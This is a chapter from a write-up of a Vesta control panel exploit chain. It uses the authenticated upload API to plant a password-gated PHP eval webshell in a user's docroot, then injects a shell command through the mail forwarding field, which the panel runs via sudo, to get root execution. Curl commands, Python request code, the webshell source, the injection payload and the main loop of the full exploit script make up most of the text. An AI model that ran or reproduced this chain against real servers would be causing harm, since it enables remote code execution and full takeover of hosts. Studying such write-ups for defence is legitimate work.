# 05 — Foothold: file write into a docroot, execution as the vhost user

The panel lets a customer create a web domain and upload files into it. That is the product working
as intended. It also means the customer controls PHP source that Apache will execute.

---

## 5.1 Create a web domain

A panel user can only create domains under their own account, which is fine — we own `jack`.

```bash
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)

curl -sk -b cookies.txt -c cookies.txt \
  -d "ok=add" -d "token=$TOK" \
  -d "v_domain=4wfarbc2dg.poc" \
  -d "v_ip=<panel-ip>" \
  -d "v_aliases=www.4wfarbc2dg.poc" \
  -d "v_dns=on" -d "v_mail=on" -d "v_proxy=on" \
  https://192.168.161.156:8083/api/v1/add/web/index.php
```

The script does this defensively: it lists existing web domains first, and reuses one if the random
`.poc` name already exists.

```python
r = us.get(targetHost + '/api/v1/list/web/index.php', verify=False)
...
r2 = us.post(targetHost + '/api/v1/add/web/index.php', verify=False, data={
    "ok": "add", "token": getSession(us, targetHost, 2)['token'],
    "v_domain": shellHost, "v_ip": selectedIP, "v_aliases": "www." + shellHost,
    "v_dns": "on", "v_mail": "on", "v_proxy": "on", "v_proxy_ext": webConf['proxy_ext']})
```

Creating the domain builds the directory tree:

```text
/home/jack/web/4wfarbc2dg.poc/public_html/
```

## 5.2 Upload a webshell into it

`/api/v1/upload/` takes a `dir` query parameter and a multipart file — the *same* handler that
refuses unauthenticated callers. Authenticated, it is a general file-write primitive.

```python
r = us.post(targetHost + '/api/v1/upload/?dir=/home/' + username + '/web/' + shellHost + '/public_html',
            verify=False,
            files={'files': ('ownwebshell.php',
                             '<?php\nif(@$_GET["password"]!="e43c9f07ed59712efa492aa0ae259cd0") exit();\n'
                             'eval($_GET["e"]);')})
```

The shell itself:

```php
<?php
if (@$_GET["password"] != "e43c9f07ed59712efa492aa0ae259cd0") exit();
eval($_GET["e"]);
```

A shared secret gates it — so an opportunistic scanner that finds `ownwebshell.php` gets nothing.
That is worth copying in your own PoCs: an unauthenticated `eval()` on a test box is how writeups get
turned into someone else's access.

**Reading the primitive:**

- The upload path is **absolute**, supplied by the client. Nothing restricts it to the user's own
  home. That is the CVE-2021-28379 shape, authenticated.
- `public_html` is served by Apache with `mod_fcgid`, so PHP executes **as `jack`** — the vhost
  owner — not as `www-data`.
- The file lands owned by the vhost user with the right permissions, because the panel creates it.

Call it with the vhost's `Host` header:

```bash
curl -s "http://192.168.161.156/ownwebshell.php?password=e43c9f07ed59712efa492aa0ae259cd0&e=id" \
  -H 'Host: 4wfarbc2dg.poc'
```

The response body is whatever the command printed. Because Apache runs the file through
`mod_fcgid`, that is the **vhost owner** — `jack` — not `www-data`. The `Host` header is required:
without it nginx serves the 1055-byte placeholder vhost and the file is never reached.

The script departs from a manual test here and goes straight on to the injection, so the webshell
was verified in practice by the root shell it later carried commands for — not by a separate `id`
call.

## 5.3 This is a foothold, not root

`jack` is a normal system user with no administrative rights in the panel. A webshell as `jack` is a
foothold, not a win. It is useful for two things only: proving execution, and giving us **file
handles we control** for the next step.

That second point is the whole reason it exists in this chain. Chapter 06 needs a directory the
attacker can write a command into and read a result out of — `public_html` is exactly that, and the
webshell provides both halves:

```text
/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec    <- we write the command here
/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult    <- root writes the output here
```

## 5.4 Where the real bug is

Reading the mail-edit handler shows the shape of the problem. The panel takes the forwarding address
and hands it to the mail script:

```python
r = us.post(targetHost + '/api/v1/edit/mail/index.php?domain=' + shellHost + '&account=' + Vaccount,
            verify=False, data={
                "save": "save", "token": getSession(us, targetHost, 2)['token'],
                "v_domain": shellHost, "v_password": '', "v_quota": "unlimited",
                "v_aliases": '', "v_fwd": payload, "v_credentials": '',
                "Username": "@" + shellHost, "v_account": Vaccount, "Password": ''})
```

`v_fwd` is an email forwarding address — user-controlled free text. It is interpolated into the
command line of `v-edit-mail-account`, which the panel invokes through
`/usr/bin/sudo`. The next chapter closes the loop.

## 5.5 The full script

The whole chain — domain creation, upload, mailbox creation, injection — is in
[`scripts/vesta-rce-exploit.py`](scripts/vesta-rce-exploit.py). It is a standalone single file and
needs only `requests`.

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install requests
python3 scripts/vesta-rce-exploit.py https://192.168.161.156:8083 jack '3PUKsX98BMupBiCf'
```

Its `main()` is the chain in twelve lines:

```python
ip         = getIPfromHostname(target_host)
pwn_domain = f"{get_random_string().lower()}.poc"
session    = requests.Session()

login(session, target_host, username, password)
getWebshell(session, target_host, pwn_domain, username, ip)
mailbox = createMailBox(session, target_host, pwn_domain, True)
editMailBox(..., 'testPayload')                      # verify the field is injectable

backdoor_payload = (
    f"';bash</home/{username}/web/{pwn_domain}/public_html/iamroot/cmdtoexec>"
    f"/home/{username}/web/{pwn_domain}/public_html/iamroot/cmdresult;A='"
)
editMailBox(..., backdoor_payload)                   # root context fires here

while True:
    cmd = input("# ").strip()
    deploycommand(cmd, ip, pwn_domain)               # webshell writes cmdtoexec
    editMailBox(..., "foobar")                       # re-trigger the injection
    print(queryWebshell('echo `cat ./iamroot/cmdresult;`;', ip, pwn_domain))
```

Two design notes:

- `editMailBox(..., 'testPayload')` first is a **capability check**. If the edit fails, the whole
  chain stops before creating a backdoor — better than leaving half an exploit on the box.
- Each command costs three HTTP requests. It is not a socket; it is a stateless request loop, which
  is why it feels slow.
